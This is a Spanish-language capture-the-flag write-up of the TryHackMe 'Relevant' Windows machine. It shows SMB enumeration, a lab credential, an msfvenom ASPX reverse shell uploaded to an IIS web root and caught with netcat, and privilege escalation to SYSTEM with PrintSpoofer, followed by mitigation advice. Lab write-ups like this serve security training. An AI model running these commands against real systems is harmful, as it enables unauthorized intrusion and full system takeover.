---
layout: page
title: "Write-up: Relevant"
platform: "TryHackMe"
difficulty: "Medium"
category: "Boot2Root"
---

**Write-up**: Relevant - TryHackMe  
**Fecha**: 04/04/2026  
**Autor**: Adrian Sanchez Torrejon  
**Dificultad**: Media  
**IP de la Máquina**: 10.129.139.9

---

# 1. Resumen Ejecutivo

La máquina Relevant es de nivel medio/difícil con sistema operativo Windows. El vector de entrada inicial consistió en la explotación de un recurso compartido de SMB vulnerable con permisos de escritura que estaba vinculado directamente a la raíz de un servidor web IIS. Tras subir una shell y conseguir ejecución remota de código (RCE), se obtuvo acceso al sistema bajo el contexto de una cuenta de servicio web. La escalada de privilegios se logró de manera exitosa abusando del privilegio `SeImpersonatePrivilege` mediante la herramienta PrintSpoofer.

- **Acceso a Usuario**: Conseguido
- **Acceso a Root(SYSTEM)**: Conseguido

# 2. Reconocimiento y Enumeración

## 2.1 Escaneo de Puertos (Nmap)

Se realiza un escaneo inicial para identificar los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -p- -Pn 10.129.139.9
```

**Resultados:** 

![image.png](/assets/images/Relevant/image.png)

## 2.3 Escaneo Smb

Haciendo uso de `smbclient` descubrí que era posible entar en el sistema de archivos del servidor sin credenciales.

```bash
smbclient -L 10.129.139.9
smbclient //10.129.139.9/nt4wrksv
get passwords.txt
```

![image.png](/assets/images/Relevant/image%201.png)

# 3. Explotación (Acceso Inicial)

## 3.1 Identificación de la Vulnerabilidad

Durante la fase de enumeración del servicio SMB, se detectó el recurso compartido `nt4wrksv`. Tras obtener credenciales válidas para el usuario Bob en fases previas, se procedió a interactuar con el recurso.

- **Usuario:** `Bob`
- **Contraseña:** `! P@$$W0rD!123`

![image.png](/assets/images/Relevant/image%202.png)

## 3.2 Ejecución y Shell

1. Al explorar el recurso, se identificó que todo archivo depositado aquí era accesible e interpretable desde el servidor web de IIS apuntando al directorio `/nt4wrksv/`. Procedí a subir un archivo para obtener ejecución remota de comandos en el sistema.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.146.227 LPORT=8080 -f aspx -o exploit.aspx
smbclient //10.129.139.9/nt4wrksv -U Bob%'!P@$$W0rD!123'
put exploit.aspx
```

![image.png](/assets/images/Relevant/image%203.png)

1. Abri un puerto con `nc` para conseguir la sesion, mientras accedi al archivo que habia subido al servidor desde la pagina web.

```bash
nc -lvp 8080
http://10.129.139.9:49663/nt4wrksv/exploit.aspx
```

![image.png](/assets/images/Relevant/image%204.png)

# 4. Escalada de Privilegios (System / Root)

## 4.1 Enumeración Interna

Tras obtener acceso a la consola del servidor, verifiqué los privilegios asignados a nuestro token de usuario actual utilizando el comando `whoami /priv`. El resultado arrojó que el privilegio **SeImpersonatePrivilege** se encontraba en estado habilitado (*Enabled*).

![image.png](/assets/images/Relevant/image%205.png)

## 4.2 Explotación y Acceso SYSTEM

Debido a que el sistema operativo era Windows Server 2016 / Windows 10, el privilegio `SeImpersonatePrivilege` es altamente vulnerable al abuso de tuberías con nombre (Named Pipes) para personificar procesos del sistema.

1. Descargué el binario de **PrintSpoofer64.exe** y lo subí a la máquina víctima a través del mismo recurso compartido de SMB que aún teníamos abierto:

Archivo: [https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe)

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
smbclient //10.129.140.195/nt4wrksv -U Bob%'!P@$$W0rD!123'
put PrintSpoofer64.exe
```

![image.png](/assets/images/Relevant/image%206.png)

1. Desde la shell interactiva de la máquina víctima, navegué hasta la ruta física del servidor web donde se alojó el archivo y lo ejecuté forzando el spawn de una nueva consola de PowerShell:

```bash
c:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -i -c powershell
```

![image.png](/assets/images/Relevant/image%207.png)

¡Acceso como **SYSTEM** concedido!

# 5. Recomendaciones de Mitigación

Para evitar que un atacante replique este vector de ataque en un entorno real, se sugieren las siguientes mitigaciones:

1. **Seguridad en SMB e IIS:** No permitir que recursos compartidos de red con permisos de escritura para usuarios comunes o invitados apunten directamente a las raíces físicas de ejecución de un servidor web (como `inetpub\wwwroot`).
2. **Principio de Menor Privilegio:** Limitar la asignación del privilegio `SeImpersonatePrivilege` estrictamente a aquellas cuentas de servicio que lo requieran para su funcionamiento y que no puedan ser comprometidas fácilmente desde el exterior.
3. **Actualización de Sistemas:** Asegurarse de mantener el sistema operativo actualizado con los parches de seguridad más recientes para mitigar exploits conocidos de elevación de privilegios.